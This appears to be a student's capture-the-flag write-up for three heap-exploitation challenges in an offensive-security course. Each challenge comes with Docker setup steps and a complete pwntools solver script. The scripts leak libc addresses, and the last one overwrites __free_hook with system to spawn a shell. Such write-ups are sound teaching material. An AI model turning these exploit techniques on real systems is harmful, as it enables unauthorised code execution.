---
tags:
  - offsec
---
_by Vaughn Valle_
### Thread and Needle
#### Setup Docker container
Setup directory to port over to interactive later
![[Pasted image 20241119172312.png]]
Once the files are in our directory, we can build the container from `Dockerfile`
```bash
docker build -t ubuntu2004 .  
```
And then launch an interactive terminal session within the container we just built
```bash
docker run --rm -it -v `pwd`:/chal ubuntu2004
```
#### Static Analysis in IDA
![[Pasted image 20241119175115.png]]
#### Solver Script
```python
from pwn import *

local = False
binary = './thread_and_needle'

if not local:
    conn = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1211)
    conn.recvuntil(b':')
    conn.sendline('vqv9731')
else:
    conn = process(binary)

def setup(item_type, stitch_length, stitch_type):
  conn.recvuntil(b'>')
  conn.sendline(b'1')

  conn.recvuntil(b'>')
  conn.sendline(item_type.encode())

  conn.recvuntil(b'>')
  conn.sendline(stitch_length.encode())

  conn.recvuntil(b'>')
  conn.sendline(stitch_type.encode())

def edit():
  conn.recvuntil(b'>')
  conn.sendline(b'2')

  conn.recvuntil(b'>')
  conn.sendline(b'2')
  conn.recvuntil(b':')
  leak = (conn.recvline().strip())
  number = int(leak, 16)
  number_zeroed = number & ~0xfff
  leak = number_zeroed

  conn.recvuntil(b'>')
  conn.sendline(b'1')
  
  conn.recvuntil(b'>')
  conn.sendline(b'1')

  conn.recvuntil(b'>')
  conn.sendline(b'1')

  answer_heap(str(leak))

def make():
  conn.recvuntil(b'>')
  conn.sendline(b'3')

def quit():
  conn.recvuntil(b'>')
  conn.sendline(b'4')

def answer_heap(message):
  conn.recvuntil(b'?\n')
  conn.send(message.encode())

setup("go", "5", "ok")
answer_heap("ok")
make()
answer_heap("ok")
edit()
answer_heap("ok")
make()
print(conn.recv())
```

#### Get the Flag
![[Pasted image 20241119173602.png]]
### Sneaky Leak

#### Setup Docker container
Setup directory to port over to interactive later
![[Pasted image 20241119172633.png]]
Once the files are in our directory, we can build the container from `Dockerfile`
```bash
docker build -t ubuntu2004 .  
```
And then launch an interactive terminal session within the container we just built
```bash
docker run --rm -it -v `pwd`:/chal ubuntu2004
```
#### Static Analysis in IDA
![[Pasted image 20241119175227.png]]
#### Solver Script
```python
from pwn import *

local = False
binary = './sneaky_leak'

if not local:
    conn = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1210)
    conn.recvuntil(b':')
    conn.sendline('vqv9731')
else:
    conn = process(binary)

libc = ELF('./libc.so.6')  

def free(given_index):
  conn.recvuntil(b'>')
  conn.sendline(b'1')
  conn.recvuntil(b'>')
  conn.sendline(given_index.encode())

def read(given_index):
  conn.recvuntil(b'>')
  conn.sendline(b'2')
  conn.recvuntil(b'>')
  conn.sendline(given_index.encode())
  conn.recvuntil(b':')
  leak = conn.recvline().strip()
  leak = int.from_bytes(leak, byteorder='little')  
  glibc_base = (leak -96) - 0x1ecb80
  libc.address = glibc_base
  system = libc.symbols.system
  guess_system(str(system))
  conn.recvline()

def allocate(given_index):
  conn.recvuntil(b'>')
  conn.sendline(b'3')
  
  conn.recvuntil(b'>')
  conn.sendline(given_index.encode())

def guess_system(given_address):
  conn.recvuntil(b'>')
  conn.sendline(b'4')

  conn.recvuntil(b'>')
  conn.sendline(given_address.encode())

target_index = '126'

free(target_index)
allocate(target_index)
read(target_index)
```
#### Get the Flag
![[Pasted image 20241119173432.png]]
### Biiiiig Message Server
#### Setup Docker container
Setup directory to port over to interactive later
![[Pasted image 20241119173119.png]]
Once the files are in our directory, we can build the container from `Dockerfile`
```bash
docker build -t ubuntu2004 .  
```
And then launch an interactive terminal session within the container we just built
```bash
docker run --rm -it -v `pwd`:/chal ubuntu2004
```
#### Static Analysis in IDA
![[Pasted image 20241119175304.png]]
#### Solver Script
```python
from pwn import *

local = False
binary = './big_message_server'

if not local:
    conn = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1213)
    conn.recvuntil(b':')
    conn.sendline('vqv9731')
else:
    conn = process(binary)

libc = ELF('./libc.so.6')  
libc_printf = libc.symbols['printf']
libc_free_hook = libc.symbols['__free_hook']
libc_system = libc.symbols['system']


libc_printf = libc.symbols['printf']
libc_free_hook = libc.symbols['__free_hook']
libc_system = libc.symbols['system']

def get_intro():
  conn.recvuntil(b':')
  printf_address_leak = conn.recvline().strip()
  printf_address = int.from_bytes(printf_address_leak, byteorder="little")
  return printf_address


def add_message(message=("message").encode()):
  conn.recvuntil(b'>')
  conn.sendline(b'1')

  conn.recvuntil(b'>')
  conn.sendline(message)

def review_message(given_index):
  conn.recvuntil(b'>')
  conn.sendline(b'2')

  conn.recvuntil(b'>')
  conn.sendline(given_index.encode())

  conn.recvuntil('Your message is ')
  leak = conn.recvline().strip()
  print("LEAK: ", leak)

def edit_message(given_index, new_message):
  conn.recvuntil(b'>')
  conn.sendline(b'3')

  conn.recvuntil(b'>')
  conn.sendline(given_index.encode())

  conn.recvuntil(b'>')
  conn.sendline(new_message)

def send_message(given_index):
  conn.recvuntil(b'>')
  conn.sendline(b'4')
  
  conn.recvuntil(b'>')
  conn.sendline(given_index.encode())


printf = get_intro()
glibc_base = printf-libc_printf

glibc_free_hook = glibc_base + libc_free_hook-8
glibc_system = glibc_base + libc_system

add_message()
add_message()
add_message()
add_message()
add_message()

send_message("4")
send_message("3")

edit_message("2", b'A'*72 + p64(glibc_free_hook))
add_message()
add_message(p64(glibc_system))
edit_message("0", b"A"*72 + b"/bin/sh\x00")
review_message("1")
send_message("1")

print(conn.recv())
conn.interactive()
```
#### Get the Flag
![[Pasted image 20241119173249.png]]